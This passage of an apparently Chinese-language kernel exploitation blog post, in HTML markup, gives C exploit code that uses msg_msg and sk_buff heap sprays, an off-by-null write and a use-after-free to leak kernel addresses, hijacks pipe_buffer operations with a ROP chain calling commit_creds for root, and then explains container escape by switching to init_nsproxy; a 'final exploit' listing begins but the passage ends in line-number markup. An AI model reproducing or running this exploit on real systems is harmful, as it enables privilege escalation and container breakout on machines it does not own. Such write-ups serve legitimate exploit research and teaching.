class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(socket_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_eflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/03/31/pwtTNfU3Xa1smzO.png" alt="image.png"></p><h2 id="容器逃逸">容器逃逸</h2><h3 id="Step-VI-切换进程命名空间，完成容器逃逸"><a href="http://Step.VI">Step.VI</a> 切换进程命名空间，完成容器逃逸</h3><p>现在我们已经能够在内核空间进行 ROP 了，那么完成容器逃逸其实是顺水推舟的事情，容器常用的隔离手段是利用命名空间进行隔离，因此我们只需要在内核中将进程的命名空间切换为初始的全局命名空间 <code>init_nsproxy</code> 即可完成容器逃逸，执行<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 即可替换掉当前进程的命名空间</p><h3 id="FINAL-EXPLOIT">FINAL EXPLOIT</h3><p>整合了容器逃逸后的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span 